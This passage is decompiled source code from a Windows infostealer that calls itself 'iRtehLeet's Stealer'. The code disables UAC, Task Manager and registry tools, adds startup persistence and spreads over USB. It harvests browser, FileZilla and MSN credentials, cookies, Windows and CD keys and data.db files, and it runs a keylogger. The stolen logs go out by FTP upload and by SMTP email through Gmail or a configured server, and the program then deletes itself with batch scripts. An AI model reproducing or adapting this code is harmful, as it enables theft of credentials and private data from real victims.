						string_10 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0885;
						IL_0885:
						num = 110;
						string_11 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_089a;
						IL_089a:
						num = 111;
						string_12 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_08af;
						IL_08af:
						num = 112;
						string_13 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_08c4;
						IL_08c4:
						num = 113;
						string_14 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_08d9;
						IL_08d9:
						num = 114;
						string_15 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_08ee;
						IL_08ee:
						num = 115;
						string_16 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0903;
						IL_0903:
						num = 116;
						string_17 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0918;
						IL_0918:
						num = 117;
						string_18 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_092d;
						IL_092d:
						num = 118;
						string_19 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0942;
						IL_0942:
						num = 119;
						string_20 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0957;
						IL_0957:
						num = 120;
						string_21 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_096c;
						IL_096c:
						num = 121;
						string_22 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0981;
						IL_0981:
						num = 122;
						FileSystem.FileGet(1, ref string_1, -1L, false);
						goto IL_099a;
						IL_099a:
						num = 123;
						FileSystem.FileGet(1, ref string_2, -1L, false);
						goto IL_09b3;
						IL_09b3:
						num = 124;
						FileSystem.FileGet(1, ref string_3, -1L, false);
						goto IL_09cc;
						IL_09cc:
						num = 125;
						FileSystem.FileGet(1, ref string_4, -1L, false);
						goto IL_09e5;
						IL_09e5:
						num = 126;
						FileSystem.FileGet(1, ref string_5, -1L, false);
						goto IL_09fe;
						IL_09fe:
						num = 127;
						FileSystem.FileGet(1, ref string_6, -1L, false);
						goto IL_0a17;
						IL_0a17:
						num = 128;
						FileSystem.FileGet(1, ref string_7, -1L, false);
						goto IL_0a33;
						IL_0a33:
						num = 129;
						FileSystem.FileGet(1, ref string_8, -1L, false);
						goto IL_0a4f;
						IL_0a4f:
						num = 130;
						FileSystem.FileGet(1, ref string_9, -1L, false);
						goto IL_0a6b;
						IL_0a6b:
						num = 131;
						FileSystem.FileGet(1, ref string_10, -1L, false);
						goto IL_0a87;
						IL_0a87:
						num = 132;
						FileSystem.FileGet(1, ref string_11, -1L, false);
						goto IL_0aa3;
						IL_0aa3:
						num = 133;
						FileSystem.FileGet(1, ref string_13, -1L, false);
						goto IL_0abf;
						IL_0abf:
						num = 134;
						FileSystem.FileGet(1, ref string_12, -1L, false);
						goto IL_0adb;
						IL_0adb:
						num = 135;
						FileSystem.FileGet(1, ref string_14, -1L, false);
						goto IL_0af7;
						IL_0af7:
						num = 136;
						FileSystem.FileGet(1, ref string_15, -1L, false);
						goto IL_0b13;
						IL_0b13:
						num = 137;
						FileSystem.FileGet(1, ref string_16, -1L, false);
						goto IL_0b2f;
						IL_0b2f:
						num = 138;
						FileSystem.FileGet(1, ref string_17, -1L, false);
						goto IL_0b4b;
						IL_0b4b:
						num = 139;
						FileSystem.FileGet(1, ref string_18, -1L, false);
						goto IL_0b67;
						IL_0b67:
						num = 140;
						FileSystem.FileGet(1, ref string_19, -1L, false);
						goto IL_0b83;
						IL_0b83:
						num = 141;
						FileSystem.FileGet(1, ref string_20, -1L, false);
						goto IL_0b9f;
						IL_0b9f:
						num = 142;
						FileSystem.FileGet(1, ref string_21, -1L, false);
						goto IL_0bbb;
						IL_0bbb:
						num = 143;
						FileSystem.FileGet(1, ref string_22, -1L, false);
						goto IL_0bd7;
						IL_0bd7:
						num = 144;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_0bee;
						IL_0bee:
						num = 145;
						string_0 = Strings.Split(string_1, "@ADWADAAWDAcawCWADWADAWDAWDAXAXAXACAWFWAFwlALAWLFALFAWFLAWFLAWFLAWLF@", -1, (CompareMethod)0);
						goto IL_0c0c;
						IL_0c0c:
						num = 146;
						vmethod_6().set_Text(string_0[1]);
						goto IL_0c25;
						IL_0c25:
						num = 147;
						vmethod_8().set_Text(string_0[2]);
						goto IL_0c3e;
						IL_0c3e:
						num = 148;
						vmethod_10().set_Text(string_0[3]);
						goto IL_0c57;
						IL_0c57:
						num = 149;
						vmethod_20().set_Text(string_0[12]);
						goto IL_0c71;
						IL_0c71:
						num = 150;
						VBMath.Randomize();
						goto IL_0c7c;
						IL_0c7c:
						num = 151;
						val5 = new TextBox();
						goto IL_0c89;
						IL_0c89:
						num = 152;
						val5.set_Text(string_0[17]);
						goto IL_0c9f;
						IL_0c9f:
						num = 153;
						val6 = new TextBox();
						goto IL_0cac;
						IL_0cac:
						num = 154;
						val6.set_Text(string_0[18]);
						goto IL_0cc2;
						IL_0cc2:
						num = 155;
						val7 = new TextBox();
						goto IL_0ccf;
						IL_0ccf:
						num = 156;
						val7.set_Text(GetDecryptedData(string_0[19]));
						goto IL_0ceb;
						IL_0ceb:
						num = 157;
						val8 = new TextBox();
						goto IL_0cf8;
						IL_0cf8:
						num = 158;
						val8.set_Text(string_0[20]);
						goto IL_0d0e;
						IL_0d0e:
						num = 159;
						val9 = new TextBox();
						goto IL_0d1b;
						IL_0d1b:
						num = 160;
						val9.set_Text(string_0[21]);
						goto IL_0d31;
						IL_0d31:
						num = 161;
						if (Conversions.ToBoolean(string_0[4]))
						{
							goto IL_0d46;
						}
						goto IL_0d73;
						IL_0d46:
						num = 163;
						goto IL_0d4c;
						IL_0d4c:
						ProjectData.ClearProjectError();
						num3 = 12;
						goto IL_0d54;
						IL_0d54:
						num = 165;
						AddStartup();
						goto IL_0d5f;
						IL_0d5f:
						num = 166;
						Interaction.Shell("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f", (AppWinStyle)2, false, -1);
						goto IL_0d73;
						IL_0d73:
						ProjectData.ClearProjectError();
						num3 = 13;
						goto IL_0d7b;
						IL_0d7b:
						num = 169;
						if (Conversions.ToBoolean(string_0[5]))
						{
							goto IL_0d90;
						}
						goto IL_0da1;
						IL_0d90:
						num = 171;
						goto IL_0d96;
						IL_0d96:
						num = 172;
						USBSpread();
						goto IL_0da1;
						IL_0da1:
						ProjectData.ClearProjectError();
						num3 = 14;
						goto IL_0da9;
						IL_0da9:
						num = 175;
						if (Conversions.ToBoolean(string_0[6]))
						{
							goto IL_0dbe;
						}
						goto IL_0dff;
						IL_0dbe:
						num = 177;
						goto IL_0dc4;
						IL_0dc4:
						num = 178;
						streamWriter2 = new StreamWriter(Path.GetTempPath() + "\\melt.tmp");
						goto IL_0de0;
						IL_0de0:
						num = 179;
						streamWriter2.WriteLine("melt");
						goto IL_0df2;
						IL_0df2:
						num = 180;
						streamWriter2.Close();
						goto IL_0dff;
						IL_0dff:
						num = 182;
						vmethod_14().set_Text(GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId"));
						goto IL_0e20;
						IL_0e20:
						num = 183;
						Hosts();
						goto IL_0e2c;
						IL_0e2c:
						ProjectData.ClearProjectError();
						num3 = 15;
						goto IL_0e34;
						IL_0e34:
						num = 185;
						if (Conversions.ToBoolean(string_0[7]))
						{
							goto IL_0e49;
						}
						goto IL_0eaf;
						IL_0e49:
						num = 186;
						Search("C:\\", "data.db");
						goto IL_0e60;
						IL_0e60:
						num = 187;
						enumerator = list_0.GetEnumerator();
						goto IL_0e97;
						IL_0e97:
						if (enumerator.MoveNext())
						{
							current = enumerator.Current;
							goto IL_0e7e;
						}
						((IDisposable)enumerator).Dispose();
						goto IL_0eb5;
						IL_1c4e:
						num = 330;
						Interaction.Shell(Application.get_StartupPath() + "\\melt.bat", (AppWinStyle)0, false, -1);
						goto end_IL_0000_3;
						IL_1c71:
						num = 332;
						goto end_IL_0000_3;
						IL_0e7e:
						num = 188;
						vmethod_16().set_Text(current);
						goto IL_0e91;
						IL_0e91:
						num = 189;
						goto IL_0e97;
						IL_0eaf:
						num = 191;
						goto IL_0eb5;
						IL_0eb5:
						ProjectData.ClearProjectError();
						num3 = 16;
						goto IL_0ebd;
						IL_0ebd:
						num = 194;
						if (Conversions.ToBoolean(string_0[8]))
						{
							goto IL_0ed2;
						}
						goto IL_0efa;
						IL_0ed2:
						num = 195;
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
						goto IL_0f00;
						IL_0efa:
						num = 197;
						goto IL_0f00;
						IL_0f00:
						num = 199;
						num5 = 123;
						goto IL_0f0a;
						IL_0f0a:
						ProjectData.ClearProjectError();
						num3 = 17;
						goto IL_0f12;
						IL_0f12:
						num = 201;
						if (Conversions.ToBoolean(string_0[9]))
						{
							goto IL_0f28;
						}
						goto IL_0f50;
						IL_0f28:
						num = 202;
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true)!.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
						goto IL_0f56;
						IL_0f50:
						num = 204;
						goto IL_0f56;
						IL_0f56:
						num = 206;
						num5 = 1234;
						goto IL_0f63;
						IL_0f63:
						ProjectData.ClearProjectError();
						num3 = 18;
						goto IL_0f6b;
						IL_0f6b:
						num = 208;
						if (Conversions.ToBoolean(string_0[10]))
						{
							goto IL_0f81;
						}
						goto IL_0f8f;
						IL_0f81:
						num = 209;
						Cookies();
						goto IL_0f95;
						IL_0f8f:
						num = 211;
						goto IL_0f95;
						IL_0f95:
						num = 213;
						num5 = 12345;
						goto IL_0fa2;
						IL_0fa2:
						ProjectData.ClearProjectError();
						num3 = 19;
						goto IL_0faa;
						IL_0faa:
						num = 215;
						if (Conversions.ToBoolean(string_0[11]))
						{
							goto IL_0fc0;
						}
						goto IL_102d;
						IL_0fc0:
						num = 216;
						vmethod_20().set_Text("900000");
						goto IL_0fd6;
						IL_0fd6:
						num = 217;
						vmethod_18().Start();
						goto IL_0fe7;
						IL_0fe7:
						num = 218;
						vmethod_12().set_Interval(Conversions.ToInteger(vmethod_20().get_Text()));
						goto IL_1008;
						IL_1008:
						num = 219;
						vmethod_12().set_Enabled(true);
						goto IL_101a;
						IL_101a:
						num = 220;
						vmethod_12().Start();
						goto IL_1033;
						IL_102d:
						num = 222;
						goto IL_1033;
						IL_1033:
						num = 224;
						if (Conversions.ToBoolean(string_0[13]))
						{
							goto IL_1049;
						}
						goto IL_1057;
						IL_1049:
						num = 225;
						St3amKill();
						goto IL_105d;
						IL_1057:
						num = 227;
						goto IL_105d;
						IL_105d:
						num = 229;
						if (Operators.CompareString(val.get_Text(), string.Empty, false) == 0)
						{
							goto IL_1078;
						}
						goto IL_108c;
						IL_1078:
						num = 230;
						val.set_Text("=FileZilla Steal=");
						goto IL_1092;
						IL_108c:
						num = 232;
						goto IL_1092;
						IL_1092:
						num = 234;
						text5 = string.Empty;
						goto IL_109f;
						IL_109f:
						num = 235;
						if (((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName().Contains("x64"))
						{
							goto IL_10c0;
						}
						goto IL_10cf;
						IL_10c0:
						num = 236;
						text5 = "64 bit";
						goto IL_10e2;
						IL_10cf:
						num = 238;
						goto IL_10d5;
						IL_10d5:
						num = 239;
						text5 = "32 bit";
						goto IL_10e2;
						IL_10e2:
						num = 241;
						if (Conversions.ToBoolean(string_0[14]))
						{
							goto IL_10fb;
						}
						goto IL_1458;
						IL_10fb:
						num = 242;
						text6 = Conversions.ToString(DateAndTime.DatePart("d", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						goto IL_111e;
						IL_111e:
						num = 243;
						text7 = Conversions.ToString(DateAndTime.DatePart("m", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						goto IL_1141;
						IL_1141:
						num = 244;
						text8 = Conversions.ToString(DateAndTime.DatePart("yyyy", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						goto IL_1164;
						IL_1164:
						num = 245;
						text9 = Environment.UserName + "_" + text6 + "-" + text7 + "-" + text8;
						goto IL_11b1;
						IL_11b1:
						num = 246;
						random = new Random();
						goto IL_11be;
						IL_11be:
						num = 247;
						val10 = new TextBox();
						goto IL_11cb;
						IL_11cb:
						num = 248;
						val10.set_Text(random.Next(94258631).ToString());
						goto IL_11ed;
						IL_11ed:
						num = 249;
						ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + val7.get_Text() + "/" + text9 + "_" + val10.get_Text() + ".txt");
						goto IL_124e;
						IL_124e:
						num = 250;
						ftpWebRequest.Credentials = new NetworkCredential(GetDecryptedData(val5.get_Text()), GetDecryptedData(val6.get_Text()));
						goto IL_127a;
						IL_127a:
						num = 251;
						ftpWebRequest.Method = "STOR";
						goto IL_128c;
						IL_128c:
						num = 252;
						streamWriter3 = new StreamWriter(Path.GetTempPath() + "\\ftptest.tmp");
						goto IL_12a8;
						IL_12a8:
						num = 253;
						streamWriter3.WriteLine("============iRtehLeet's Stealer Log============\r\n============Victim didn't have a data.db============\r\n\r\n" + val2.get_Text() + "\r\n\r\n============Windows Key Stealer============\r\n" + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName() + " (" + text5 + ") : " + vmethod_14().get_Text() + "\r\n\r\n============MSN Stealer============\r\n" + vmethod_4().get_Text() + "\r\n" + val4.get_Text() + "============FireFox Stealer============\r\n" + vmethod_2().get_Text() + "\r\n============Chrome Stealer============\r\n" + vmethod_0().get_Text() + "\r\n" + val.get_Text() + "\r\n\r\n" + val3.get_Text() + "\r\n============CD Key Stealer============\r\n" + streamReader3.ReadToEnd() + "\r\n=CD KEYS=");
						goto IL_13cb;
						IL_13cb:
						num = 254;
						streamWriter3.Dispose();
						goto IL_13d8;
						IL_13d8:
						num = 255;
						streamWriter3.Close();
						goto IL_13e5;
						IL_13e5:
						num = 256;
						array2 = File.ReadAllBytes(Path.GetTempPath() + "\\ftptest.tmp");
						goto IL_1401;
						IL_1401:
						num = 257;
						requestStream = ftpWebRequest.GetRequestStream();
						goto IL_1410;
						IL_1410:
						num = 258;
						requestStream.Write(array2, 0, array2.Length);
						goto IL_1424;
						IL_1424:
						num = 259;
						requestStream.Close();
						goto IL_1431;
						IL_1431:
						num = 260;
						requestStream.Dispose();
						goto IL_143e;
						IL_143e:
						num = 261;
						File.Delete(Path.GetTempPath() + "\\ftptest.tmp");
						goto IL_1458;
						IL_1458:
						ProjectData.ClearProjectError();
						num3 = 20;
						goto IL_1460;
						IL_1460:
						num = 264;
						text10 = vmethod_6().get_Text();
						goto IL_1473;
						IL_1473:
						num = 265;
						text11 = vmethod_8().get_Text();
						goto IL_1486;
						IL_1486:
						num = 266;
						text12 = vmethod_10().get_Text();
						goto IL_1499;
						IL_1499:
						num = 267;
						mailMessage = new MailMessage();
						goto IL_14a6;
						IL_14a6:
						num = 268;
						mailMessage.From = new MailAddress(GetDecryptedData(text10));
						goto IL_14c0;
						IL_14c0:
						num = 269;
						mailMessage.To.Add(GetDecryptedData(text12));
						goto IL_14da;
						IL_14da:
						num = 270;
						mailMessage.Subject = "iRtehLeet's Stealer : " + ((ServerComputer)Class1.smethod_0()).get_Name();
						goto IL_14fb;
						IL_14fb:
						num = 271;
						mailMessage.Body = "============iRtehLeet's Stealer Log============\r\n============Victim didn't have a data.db============\r\n\r\n" + val2.get_Text() + "\r\n\r\n============Windows Key Stealer============\r\n" + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName() + " (" + text5 + ") : " + vmethod_14().get_Text() + "\r\n\r\n============MSN Stealer============\r\n" + vmethod_4().get_Text() + "\r\n" + val4.get_Text() + "============FireFox Stealer============\r\n" + vmethod_2().get_Text() + "\r\n============Chrome Stealer============\r\n" + vmethod_0().get_Text() + "\r\n" + val.get_Text() + "\r\n\r\n" + val3.get_Text() + "\r\n============CD Key Stealer============\r\n" + streamReader3.ReadToEnd() + "\r\n=CD KEYS=";
						goto IL_161e;
						IL_161e:
						num = 272;
						smtpClient = new SmtpClient("smtp.gmail.com");
						goto IL_1630;
						IL_1630:
						num = 273;
						smtpClient.Port = 587;
						goto IL_1642;
						IL_1642:
						num = 274;
						smtpClient.Credentials = new NetworkCredential(GetDecryptedData(text10), GetDecryptedData(text11));
						goto IL_1664;
						IL_1664:
						num = 275;
						smtpClient.EnableSsl = true;
						goto IL_1672;
						IL_1672:
						num = 276;
						smtpClient.Send(mailMessage);
						goto IL_1681;
						IL_1681:
						num = 277;
						if (vmethod_16().get_Text().Contains("data.db"))
						{
							goto IL_16a1;
						}
						goto IL_18e4;
						IL_16a1:
						ProjectData.ClearProjectError();
						num3 = 21;
						goto IL_16a9;
						IL_16a9:
						num = 279;
						text13 = vmethod_6().get_Text();
						goto IL_16bc;
						IL_16bc:
						num = 280;
						text14 = vmethod_8().get_Text();
						goto IL_16cf;
						IL_16cf:
						num = 281;
						vmethod_10().get_Text();
						goto IL_16e1;
						IL_16e1:
						num = 282;
						mailMessage2 = new MailMessage();
						goto IL_16ee;
						IL_16ee:
						num = 283;
						mailMessage2.From = new MailAddress(GetDecryptedData(text10));
						goto IL_1708;
						IL_1708:
						num = 284;
						item = new Attachment(vmethod_16().get_Text());
						goto IL_1720;
						IL_1720:
						num = 285;
						mailMessage2.To.Add(GetDecryptedData(text12));
						goto IL_173a;
						IL_173a:
						num = 286;
						mailMessage2.Subject = "iRtehStealer : data.db Inside : " + ((ServerComputer)Class1.smethod_0()).get_Name();
						goto IL_175b;
						IL_175b:
						num = 287;
						mailMessage2.Body = "Check the attachment for a stolen data.db!";
						goto IL_176d;
						IL_176d:
						num = 288;
						mailMessage2.Attachments.Add(item);
						goto IL_1781;
						IL_1781:
						num = 289;
						smtpClient2 = new SmtpClient("smtp.gmail.com");
						goto IL_1793;
						IL_1793:
						num = 290;
						smtpClient2.Port = 587;
						goto IL_17a5;
						IL_17a5:
						num = 291;
						smtpClient2.Credentials = new NetworkCredential(GetDecryptedData(text13), GetDecryptedData(text14));
						goto IL_17c7;
						IL_17c7:
						num = 292;
						smtpClient2.EnableSsl = true;
						goto IL_17d5;
						IL_17d5:
						num = 293;
						smtpClient2.Send(mailMessage2);
						goto IL_17e4;
						IL_17e4:
						num = 294;
						streamWriter4 = new StreamWriter(Application.get_StartupPath() + "\\melt2.bat");
						goto IL_1800;
						IL_1800:
						num = 295;
						streamWriter4.WriteLine("@echo off");
						goto IL_1812;
						IL_1812:
						num = 296;
						streamWriter4.WriteLine("sleep 900");
						goto IL_1824;
						IL_1824:
						num = 297;
						streamWriter4.WriteLine("TASKKILL /F /IM " + Application.get_ProductName());
						goto IL_1840;
						IL_1840:
						num = 298;
						streamWriter4.WriteLine("TASKKILL /F /IM " + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath() + "\\", string.Empty, 1, -1, (CompareMethod)0));
						goto IL_1878;
						IL_1878:
						num = 299;
						streamWriter4.WriteLine("del " + vmethod_16().get_Text());
						goto IL_189a;
						IL_189a:
						num = 300;
						streamWriter4.WriteLine("del melt2.bat");
						goto IL_18ac;
						IL_18ac:
						num = 301;
						streamWriter4.Flush();
						goto IL_18b9;
						IL_18b9:
						num = 302;
						streamWriter4.Close();
						goto IL_18c6;
						IL_18c6:
						num = 303;
						Interaction.Shell(Application.get_StartupPath() + "\\melt2.bat", (AppWinStyle)0, false, -1);
						goto IL_18e4;
						IL_18e4:
						ProjectData.ClearProjectError();
						num3 = 22;
						goto IL_18ec;
						IL_18ec:
						num = 306;
						text15 = vmethod_6().get_Text();
						goto IL_18ff;
						IL_18ff:
						num = 307;
						text16 = vmethod_8().get_Text();
						goto IL_1912;
						IL_1912:
						num = 308;
						text17 = vmethod_10().get_Text();
						goto IL_1925;
						IL_1925:
						num = 309;
						mailMessage3 = new MailMessage();
						goto IL_1932;
						IL_1932:
						num = 310;
						mailMessage3.From = new MailAddress(GetDecryptedData(text15));
						goto IL_194c;
						IL_194c:
						num = 311;
						mailMessage3.To.Add(GetDecryptedData(text17));
						goto IL_1966;
						IL_1966:
						num = 312;
						mailMessage3.Subject = "iRtehLeet's Stealer : " + ((ServerComputer)Class1.smethod_0()).get_Name();
						goto IL_1987;
						IL_1987:
						num = 313;
						mailMessage3.Body = "============iRtehLeet's Stealer Log============\r\n============Victim didn't have a data.db============\r\n\r\n" + val2.get_Text() + "\r\n\r\n============Windows Key Stealer============\r\n" + ((ServerComputer)Class1.smethod_0()).get_Info().get_OSFullName() + " (" + text5 + ") : " + vmethod_14().get_Text() + "\r\n\r\n============MSN Stealer============\r\n" + vmethod_4().get_Text() + "\r\n" + val4.get_Text() + "============FireFox Stealer============\r\n" + vmethod_2().get_Text() + "\r\n============Chrome Stealer============\r\n" + vmethod_0().get_Text() + "\r\n" + val.get_Text() + "\r\n\r\n" + val3.get_Text() + "\r\n============CD Key Stealer============\r\n" + streamReader3.ReadToEnd() + "\r\n=CD KEYS=";
						goto IL_1aaa;
						IL_1aaa:
						num = 314;
						smtpClient3 = new SmtpClient(val8.get_Text());
						goto IL_1abe;
						IL_1abe:
						num = 315;
						smtpClient3.Port = Conversions.ToInteger(val9.get_Text());
						goto IL_1ad7;
						IL_1ad7:
						num = 316;
						smtpClient3.Credentials = new NetworkCredential(GetDecryptedData(text15), GetDecryptedData(text16));
						goto IL_1af9;
						IL_1af9:
						num = 317;
						smtpClient3.EnableSsl = true;
						goto IL_1b07;
						IL_1b07:
						num = 318;
						smtpClient3.Send(mailMessage3);
						goto IL_1b16;
						IL_1b16:
						num = 319;
						if (File.Exists(Path.GetTempPath() + "\\melt.tmp"))
						{
							goto IL_1b35;
						}
						goto IL_1c71;
						IL_1b35:
						num = 320;
						streamWriter = new StreamWriter(Application.get_StartupPath() + "\\melt.bat");
						goto IL_1b51;
						IL_1b51:
						num = 321;
						streamWriter.WriteLine("@echo off");
						goto IL_1b63;
						IL_1b63:
						num = 322;
						streamWriter.WriteLine("sleep 900");
						goto IL_1b75;
						IL_1b75:
						num = 323;
						streamWriter.WriteLine("TASKKILL /F /IM " + Application.get_ProductName());
						goto IL_1b91;
						IL_1b91:
						num = 324;
						streamWriter.WriteLine("TASKKILL /F /IM " + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath() + "\\", string.Empty, 1, -1, (CompareMethod)0));
						goto IL_1bc9;
						IL_1bc9:
						num = 325;
						streamWriter.WriteLine("del " + Strings.Replace(Application.get_ExecutablePath(), Application.get_StartupPath() + "\\", string.Empty, 1, -1, (CompareMethod)0));
						goto IL_1c01;
						IL_1c01:
						num = 326;
						streamWriter.WriteLine("del " + Path.GetTempPath() + "\\melt.tmp");
						goto IL_1c22;
						IL_1c22:
						num = 327;
						streamWriter.WriteLine("del melt.bat");
						goto IL_1c34;
						IL_1c34:
						num = 328;
						streamWriter.Flush();
						goto IL_1c41;
						end_IL_0000_2:
						break;
					}
					num = 17;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj, num5);
				try0000_dispatch = 8657;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_036c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_0383: Unknown result type (might be due to invalid IL or missing references)
		//IL_038a: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					if (Conversions.ToBoolean(string_0[14]))
					{
						TextBox val = new TextBox();
						val.set_Text(string_0[17]);
						TextBox val2 = new TextBox();
						val2.set_Text(string_0[18]);
						TextBox val3 = new TextBox();
						val3.set_Text(GetDecryptedData(string_0[19]));
						TextBox val4 = new TextBox();
						val4.set_Text(string_0[20]);
						TextBox val5 = new TextBox();
						val5.set_Text(string_0[21]);
						string text = Conversions.ToString(DateAndTime.DatePart("d", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						string text2 = Conversions.ToString(DateAndTime.DatePart("m", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						string text3 = Conversions.ToString(DateAndTime.DatePart("yyyy", (object)DateTime.Now, (FirstDayOfWeek)1, (FirstWeekOfYear)1));
						string text4 = Environment.UserName + "_" + text + "-" + text2 + "-" + text3;
						Random random = new Random();
						TextBox val6 = new TextBox();
						val6.set_Text(random.Next(94258631).ToString());
						FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://" + val3.get_Text() + "/" + text4 + "_KEYLOG_" + val6.get_Text() + ".txt");
						ftpWebRequest.Credentials = new NetworkCredential(GetDecryptedData(val.get_Text()), GetDecryptedData(val2.get_Text()));
						ftpWebRequest.Method = "STOR";
						StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "\\ftpk.tmp");
						streamWriter.WriteLine("iRtehStealer : Keylogger Log : " + ((ServerComputer)Class1.smethod_0()).get_Name() + "\r\n\r\n" + vmethod_22().get_Text());
						streamWriter.Dispose();
						streamWriter.Close();
						byte[] array = File.ReadAllBytes(Path.GetTempPath() + "\\ftpk.tmp");
						Stream requestStream = ftpWebRequest.GetRequestStream();
						requestStream.Write(array, 0, array.Length);
						requestStream.Close();
						requestStream.Dispose();
						File.Delete(Path.GetTempPath() + "\\ftpk.tmp");
					}
					if (Conversions.ToBoolean(string_0[15]))
					{
						ProjectData.ClearProjectError();
						num2 = 2;
						string text5 = vmethod_6().get_Text();
						string text6 = vmethod_8().get_Text();
						string text7 = vmethod_10().get_Text();
						MailMessage mailMessage = new MailMessage();
						mailMessage.From = new MailAddress(GetDecryptedData(text5));
						mailMessage.To.Add(GetDecryptedData(text7));
						mailMessage.Subject = "iRtehStealer : Keylogger Log : " + ((ServerComputer)Class1.smethod_0()).get_Name();
						mailMessage.Body = vmethod_22().get_Text();
						SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
						smtpClient.Port = 587;
						smtpClient.Credentials = new NetworkCredential(GetDecryptedData(text5), GetDecryptedData(text6));
						smtpClient.EnableSsl = true;
						smtpClient.Send(mailMessage);
					}
					goto IL_0359;
				case 1152:
					{
						num = -1;
						switch (num2)
						{
						case 2:
							break;
						case 3:
							goto end_IL_0000;
						default:
							goto end_IL_0000_2;
						}
						goto IL_0359;
					}
					IL_0359:
					if (Conversions.ToBoolean(string_0[16]))
					{
						TextBox val7 = new TextBox();
						val7.set_Text(string_0[20]);
						TextBox val8 = new TextBox();
						val8.set_Text(string_0[21]);
						ProjectData.ClearProjectError();
						num2 = 3;
						string text8 = vmethod_6().get_Text();
						string text9 = vmethod_8().get_Text();
						string text10 = vmethod_10().get_Text();
						MailMessage mailMessage2 = new MailMessage();
						mailMessage2.From = new MailAddress(GetDecryptedData(text8));
						mailMessage2.To.Add(GetDecryptedData(text10));
						mailMessage2.Subject = "iRtehStealer : Keylogger Log : " + ((ServerComputer)Class1.smethod_0()).get_Name();
						mailMessage2.Body = vmethod_22().get_Text();
						SmtpClient smtpClient2 = new SmtpClient(val7.get_Text());
						smtpClient2.Port = Conversions.ToInteger(val8.get_Text());
						smtpClient2.Credentials = new NetworkCredential(GetDecryptedData(text8), GetDecryptedData(text9));
						smtpClient2.EnableSsl = true;
						smtpClient2.Send(mailMessage2);
					}
					break;
					end_IL_0000:
					break;
				}
				((TextBoxBase)vmethod_22()).Clear();
				break;
				end_IL_0000_2:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1152;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(string_23, method_0(), false) != 0)
		{
			vmethod_22().set_Text(vmethod_22().get_Text() + "\r\n[" + method_0() + "]:\r\n");
			string_23 = method_0();
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
